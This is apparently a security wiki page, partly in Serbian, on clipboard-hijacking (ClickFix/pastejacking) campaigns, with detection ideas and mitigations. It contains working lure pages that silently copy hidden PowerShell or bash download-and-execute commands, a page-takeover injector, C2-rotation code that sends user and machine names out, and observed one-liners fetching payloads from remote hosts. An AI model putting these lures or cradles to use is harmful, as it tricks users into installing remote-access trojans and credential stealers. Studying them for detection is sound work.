# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – stari ali i dalje važeći savet

## Overview

Clipboard hijacking – takođe poznat kao *pastejacking* – zloupotrebljava činjenicu da korisnici rutinski kopiraju-i-lepe komande bez provere. Zlonamerna web stranica (ili bilo koji kontekst sa JavaScript mogućnostima, kao što je Electron ili Desktop aplikacija) programski ubacuje tekst pod kontrolom napadača u sistemski clipboard. Žrtve se podstiču, obično pažljivo osmišljenim social-engineering uputstvima, da pritisnu **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), ili otvore terminal i *nalepi* sadržaj clipboard-a, odmah izvršavajući proizvoljne komande.

Pošto se **ne preuzima nijedan fajl i ne otvara nijedan attachment**, tehnika zaobilazi većinu e-mail i web-content security kontrola koje prate attachments, macros ili direktno izvršavanje komandi. Napad je zato popularan u phishing kampanjama koje isporučuju commodity malware familije kao što su NetSupport RAT, Latrodectus loader ili Lumma Stealer.

## Wallet-address replacement clippers

Druga varijanta **clipboard hijacking** ne lepi komande uopšte: čeka dok žrtva ne kopira **cryptocurrency wallet address**, zatim je tiho zamenjuje adresom pod kontrolom napadača neposredno pre lepljenja. Ovo je posebno efikasno protiv dugih wallet formata jer korisnici često proveravaju samo prve/poslednje karaktere.

Uobičajene osobine iz prakse:
- **Thin loader + nested payload**: vidljiva app/exe izgleda kao legitiman trading ili "profit" alat, dok je pravi clipper sakriven dublje u bundle-u (na primer .NET loader koji pokreće ugnježdeni Rust payload).
- **Regex-driven replacement**: malware prepoznaje stringove kao što su `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, ili čak generičke **44-character Solana-like** stringove i prepisuje ih u attacker wallet-e.
- **Wallet rotation at scale**: moderni Windows primerci mogu da ugrađuju **hiljade** replacement wallet-a po valuti umesto jedne statične adrese, smanjujući trošenje reputacije wallet-a nakon svake krađe.

### Windows clipper flow

Uobičajena implementacija je skriveni prozor registrovan sa **`AddClipboardFormatListener`**. Pri svakoj clipboard nadogradnji, malware tipično poziva:
- **`OpenClipboard`** → pristup trenutnim clipboard podacima.
- **`GetClipboardData`** → čita tekst.
- **`EmptyClipboard`** + **`SetClipboardData`** → zamenjuje wallet string attacker vrednošću.

Minimalni hunting regex-i koji se često viđaju u clipper-ima:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Кориснички ниво persistence je dovoljan za impact. Jedan uočeni obrazac je:
- Kopirati payload u **`%APPDATA%\silke\silke.exe`**
- Kreirati **Startup-folder LNK** pod `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Ideje za detection:
- Procesi koji kontinuirano pozivaju clipboard APIs dok istovremeno upisuju u `%APPDATA%` i korisnički **Startup** folder.
- Novo LNK/executable kreiranje praćeno wallet-address clipboard rewrites.
- Archive ili fake-software bundle-ovi koji sadrže mnogo neiskorišćenih fajlova plus mali launcher koji pokreće nested binary.

### macOS social-engineered quarantine removal + LaunchAgent persistence

Na macOS-u, neke kampanje isporučuju **`unlocker.command`** helper i instruiraju žrtvu da desni klik → **Open** ako Gatekeeper kaže da je app oštećen ili od neidentifikovanog developera. Script jednostavno uklanja quarantine i pokreće obližnji `.app`:
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
This is **not** a Gatekeeper exploit; it is a **social-engineered quarantine bypass** that abuses the fact that Gatekeeper decisions depend on the `com.apple.quarantine` xattr.

After execution, the clipper can persist as the current user by writing:
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent with `RunAtLoad` and `KeepAlive`

A useful defensive detail is that some samples implement a **self-healing watchdog** that re-writes the LaunchAgent and wrapper every ~30 seconds. If you remove the plist first **without killing the running process**, the malware may recreate it immediately. Safe cleanup order:
1. Kill the active clipper process.
2. Unload/delete the LaunchAgent plist.
3. Delete `~/launch.sh` and the copied payload.

### Delivery note: fake reputation as a force multiplier

For this family, the malware itself can stay technically simple while the **distribution layer** does the heavy lifting: fake GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views, and benign-looking VirusTotal comments/votes are used to make the binary appear trustworthy before execution.

## Forced copy buttons and hidden payloads (macOS one-liners)

Some macOS infostealers clone installer sites (e.g., Homebrew) and **force use of a “Copy” button** so users cannot highlight only the visible text. The clipboard entry contains the expected installer command plus an appended Base64 payload (e.g., `...; echo <b64> | base64 -d | sh`), so a single paste executes both while the UI hides the extra stage.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Starije kampanje su koristile `document.execCommand('copy')`, a novije se oslanjaju na asinhroni **Clipboard API** (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake Flow

1. Korisnik poseti typosquatted ili kompromitovan sajt (npr. `docusign.sa[.]com`)
2. Ubaceni **ClearFake** JavaScript poziva `unsecuredCopyToClipboard()` helper koji tiho smešta Base64-enkodovan PowerShell one-liner u clipboard.
3. HTML uputstva govore žrtvi da: *“Press **Win + R**, paste the command and press Enter to resolve the issue.”*
4. `powershell.exe` se izvršava i preuzima arhivu koja sadrži legitiman executable plus malicious DLL (klasično DLL sideloading).
5. Loader dekriptira dodatne faze, ubacuje shellcode i instalira persistence (npr. scheduled task) – na kraju pokrećući NetSupport RAT / Latrodectus / Lumma Stealer.

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimni Java WebStart) pretražuje svoj direktorijum za `msvcp140.dll`.
* Zlonamerni DLL dinamički rešava API-je pomoću **GetProcAddress**, preuzima dve binarne datoteke (`data_3.bin`, `data_4.bin`) putem **curl.exe**, dešifruje ih koristeći rolling XOR ključ `"https://google.com/"`, ubacuje finalni shellcode i raspakuje **client32.exe** (NetSupport RAT) u `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Preuzima `la.txt` sa **curl.exe**
2. Izvršava JScript downloader unutar **cscript.exe**
3. Preuzima MSI payload → ostavlja `libcef.dll` pored potpisane aplikacije → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** poziv pokreće skriveni PowerShell skript koji preuzima `PartyContinued.exe`, ekstraktuje `Boat.pst` (CAB), rekonstruiše `AutoIt3.exe` preko `extrac32` i spajanja fajlova i na kraju pokreće `.a3x` skript koji eksfiltrira browser credentials ka `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Neke ClickFix kampanje potpuno preskaču preuzimanje fajlova i nalažu žrtvama da nalepе jedan red koji preko WSH-a preuzima i izvršava JavaScript, uspostavlja perzistenciju i svakog dana rotira C2. Primer posmatranog lanca:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Ključne osobine
- Obfuskovani URL se obrće tokom izvršavanja kako bi se sprečila površna inspekcija.
- JavaScript se održava preko Startup LNK (WScript/CScript) i bira C2 prema trenutnom danu – omogućavajući brzu rotaciju domena.

Minimalni JS fragment korišćen za rotaciju C2 po datumu:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Sledeći stadijum obično deploy-uje loader koji uspostavlja persistence i povlači RAT (npr. PureHVNC), često pinning TLS na hardcoded certificate i chunking traffic.

Detection ideje specifične za ovu varijantu
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (ili `cscript.exe`).
- Startup artifacts: LNK u `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` koji poziva WScript/CScript sa JS path-om ispod `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU i command-line telemetry koji sadrže `.split('').reverse().join('')` ili `eval(a.responseText)`.
- Ponovljeni `powershell -NoProfile -NonInteractive -Command -` sa velikim stdin payload-ovima za ubacivanje dugih skripti bez dugih command line-ova.
- Scheduled Tasks koji naknadno izvršavaju LOLBins kao što je `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` pod task/path-om koji izgleda kao updater (npr. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daily-rotating C2 hostnames i URL-ovi sa `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern-om.
- Korelacija clipboard write events nakon kojih sledi Win+R paste pa odmah `powershell.exe` execution.


Blue-teams mogu da kombinuju clipboard, process-creation i registry telemetry da pinpoint-uju pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` čuva istoriju **Win + R** komandi – tražite neuobičajene Base64 / obfuscated unose.
* Security Event ID **4688** (Process Creation) gde je `ParentImage` == `explorer.exe` i `NewProcessName` u { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** za kreiranje fajlova ispod `%LocalAppData%\Microsoft\Windows\WinX\` ili privremenih foldera neposredno pre sumnjivog 4688 eventa.
* EDR clipboard senzori (ako postoje) – korrelišite `Clipboard Write` odmah praćen novim PowerShell procesom.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Nedavne kampanje masovno prave lažne CDN/browser verification strane ("Just a moment…", IUAM-style) koje navode korisnike da kopiraju OS-specifične komande iz clipboarda u native konzole. Ovo prebacuje execution van browser sandbox-a i radi na Windows i macOS.

Ključne osobine builder-generated strana
- OS detection preko `navigator.userAgent` radi prilagođavanja payload-ova (Windows PowerShell/CMD vs. macOS Terminal). Opcioni decoy/no-op za unsupported OS da se održi iluzija.
- Automatsko clipboard-copy pri benignim UI akcijama (checkbox/Copy), dok vidljivi tekst može da se razlikuje od clipboard sadržaja.
- Mobile blocking i popover sa uputstvima korak po korak: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Opcioni obfuscation i single-file injector za overwriting kompromitovanog site-a sa DOM-om i Tailwind-styled verification UI (nije potrebna nova domain registration).

Primer: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS perzistencija početnog pokretanja
- Koristite `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` tako da se izvršavanje nastavi nakon zatvaranja terminala, smanjujući vidljive tragove.

Preuzimanje stranice na kompromitovanim sajtovima u mestu
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
- Ideje za detekciju i hunting specifične za IUAM-style lures
- Web: Stranice koje vezuju Clipboard API za verification widgete; neslaganje između prikazanog teksta i clipboard payload-a; `navigator.userAgent` grananje; Tailwind + single-page replace u sumnjivim kontekstima.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` ubrzo nakon browser interakcije; batch/MSI instaleri izvršeni iz `%TEMP%`.
- macOS endpoint: Terminal/iTerm koji pokreće `bash`/`curl`/`base64 -d` sa `nohup` blizu browser događaja; background jobs koji preživljavaju zatvaranje terminala.
- Korelirajte `RunMRU` Win+R istoriju i clipboard writes sa kasnijim kreiranjem console procesa.

Pogledajte i za prateće tehnike

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolucije (ClearFake, Scarlet Goldfinch)

- ClearFake i dalje kompromituje WordPress sajtove i ubacuje loader JavaScript koji lančano koristi eksternе hostove (Cloudflare Workers, GitHub/jsDelivr) i čak blockchain “etherhiding” pozive (npr. POST-ove ka Binance Smart Chain API endpointima kao što je `bsc-testnet.drpc[.]org`) da bi preuzeo trenutnu lure logiku. Nedavni overlay-ji intenzivno koriste fake CAPTCHAs koji upućuju korisnike da copy/paste-uju jedan liner (T1204.004) umesto da bilo šta preuzimaju.
- Početno izvršavanje se sve više delegira potpisanim script hostovima/LOLBAS. Lanac iz januara 2026. zamenio je raniju `mshta` upotrebu ugrađenim `SyncAppvPublishingServer.vbs` izvršenim preko `WScript.exe`, prosleđujući PowerShell-like argumente sa aliasima/wildcardima za fetch udaljenog sadržaja:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` je potpisan i normalno ga koristi App-V; uparен sa `WScript.exe` i neuobičajenim argumentima (`gal`/`gcm` aliasi, wildcarded cmdlets, jsDelivr URLs) postaje high-signal LOLBAS stage za ClearFake.
- February 2026 fake CAPTCHA payloads su se vratili na čiste PowerShell download cradles. Dva live primera:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Prvi lanac je in-memory `iex(irm ...)` grabber; drugi se staguje preko `WinHttp.WinHttpRequest.5.1`, upisuje privremeni `.ps1`, zatim pokreće sa `-ep bypass` u skrivenom prozoru.

Detection/hunting tips for these variants
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` ili PowerShell cradles odmah nakon clipboard writes/Win+R.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domeni, ili raw IP `iex(irm ...)` obrasci.
- Network: outbound ka CDN worker hostovima ili blockchain RPC endpointima iz script hosts/PowerShell-a ubrzo nakon web browsing.
- File/registry: privremeno kreiranje `.ps1` pod `%TEMP%` plus RunMRU entries koji sadrže ove one-linere; block/alert na signed-script LOLBAS (WScript/cscript/mshta) koji izvršava sa eksternim URL-ovima ili obfuskiranim alias stringovima.

## June 2026 ClickFix tradecraft: paste telemetry, fake verification comments, and LOLBin chaining

Recent Red Canary telemetry shows that the stable indicator is **not one exact command**, but the combination of **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval**, and **immediate execution**.

### Notable operator patterns

- **Paste confirmation telemetry**: some payloads call `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` before the real stage. This confirms user interaction while keeping the window short and quiet.
- **Fake verification comments**: PowerShell one-liners may append strings such as `# Security check ✔️ I'm not a robot Verification ID: 138105` so the command still looks CAPTCHA-related after it is pasted into Run / `cmd.exe` / PowerShell history.
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` avoids a static URL in the command line while still performing in-memory download-and-execute.
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` abuses unusual casing and Unicode-like characters in flags to break brittle detections while still resembling `msiexec.exe`.
- **Caret-escaped LOLBin chains**: `cmd.exe` can hide keywords with `^` escapes (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), start the nested shell minimized, save attacker content with a benign extension such as `.pdf`, and then execute it through `mshta`.
## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
2. Security awareness – teach users to *type* sensitive commands or paste them into a text editor first.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control to block arbitrary one-liners.
4. Network controls – block outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
